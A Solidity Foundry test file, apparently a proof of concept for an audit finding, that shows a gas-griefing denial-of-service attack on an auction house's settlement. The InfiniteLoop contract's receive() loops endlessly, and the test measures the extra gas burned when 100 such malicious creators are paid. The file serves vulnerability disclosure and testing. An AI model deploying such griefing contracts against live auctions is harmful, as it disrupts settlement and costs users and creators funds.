// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import { AuctionHouseTest } from "./AuctionHouse.t.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ICultureIndex } from "../../src/interfaces/ICultureIndex.sol";
import { IRevolutionToken } from "../../src/interfaces/IRevolutionToken.sol";
import { MockWETH } from "../mock/MockWETH.sol";
import { toDaysWadUnsafe } from "../../src/libs/SignedWadMath.sol";
import "forge-std/console.sol";

contract AuctionHouseDOSTest is AuctionHouseTest {
    // this function creates an auction and wait for its finish
    // if `toDoS` is true, it will create `100` creators and each creator will be a malicious contract that will
    // run an infinite loop in its `receive()`
    // if `toDoS` is false, it will create only `1` "honest" creator
    function _createAndFinishAuction(bool toDoS) internal {
        uint nCreators = toDoS ? cultureIndex.MAX_NUM_CREATORS() : 1;
        address[] memory creatorAddresses = new address[](nCreators);
        uint256[] memory creatorBps = new uint256[](nCreators);
        uint256 totalBps = 0;
        address[] memory creators = new address[](nCreators + 1);
        for (uint i = 0; i < nCreators + 1; i++) {
            if (toDoS) creators[i] = address(new InfiniteLoop());
            else creators[i] = address(uint160(0x1234 + i));
        }

        for (uint256 i = 0; i < nCreators; i++) {
            creatorAddresses[i] = address(creators[i]);
            if (i == nCreators - 1) {
                creatorBps[i] = 10_000 - totalBps;
            } else {
                creatorBps[i] = (10_000) / (nCreators - 1);
            }
            totalBps += creatorBps[i];
        }

        uint256 tokenId = createArtPieceMultiCreator(
            "Multi Creator Art",
            "An art piece with multiple creators",
            ICultureIndex.MediaType.IMAGE,
            "ipfs://multi-creator-art",
            "",
            "",
            creatorAddresses,
            creatorBps
        );

        vm.roll(vm.getBlockNumber() + 1);

        vm.startPrank(auction.owner());
        auction.unpause();
        vm.stopPrank();

        uint256 bidAmount = auction.reservePrice();
        vm.deal(address(creators[nCreators]), bidAmount + 1 ether);
        vm.startPrank(address(creators[nCreators]));
        auction.createBid{ value: bidAmount }(tokenId, address(creators[nCreators]), address(0));
        vm.stopPrank();

        vm.warp(block.timestamp + auction.duration() + 1); // Fast forward time to end the auction
    }

    function testDOS() public {
        uint gasConsumption1;
        uint gasConsumption2;
        uint gas0;
        uint gas1;

        vm.startPrank(cultureIndex.owner());
        cultureIndex._setQuorumVotesBPS(0);
        vm.stopPrank();

        _createAndFinishAuction(true);

        gas0 = gasleft();
        auction.settleCurrentAndCreateNewAuction();
        gas1 = gasleft();
        // we calculate gas consumption in case of `100` malicious creators
        gasConsumption1 = gas0 - gas1;

        _createAndFinishAuction(false);

        gas0 = gasleft();
        auction.settleCurrentAndCreateNewAuction();
        gas1 = gasleft();
        // we calculate gas consumption in case of `1` "honest" creator
        gasConsumption2 = gas0 - gas1;

        console.log("Gas consumption difference =", gasConsumption1 - gasConsumption2);
    }
}

contract InfiniteLoop {
    receive() external payable {
        while (true) {}
    }
}
